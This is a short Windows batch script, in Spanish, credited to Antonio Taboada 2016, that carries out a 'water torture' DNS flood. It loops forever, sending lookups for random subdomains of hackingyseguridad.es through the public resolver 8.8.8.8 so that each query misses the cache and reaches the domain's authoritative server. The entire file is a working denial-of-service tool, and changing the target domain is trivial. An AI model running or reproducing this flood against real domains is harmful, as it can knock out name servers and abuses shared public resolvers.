@ECHO OFF
ECHO Water Torture DNS autoritativo. (c) Antonio Taboada 2016. Version 1.
:loop
SET/A ran=%random%
NSLOOKUP %ran%.hackingyseguridad.es 8.8.8.8
goto loop
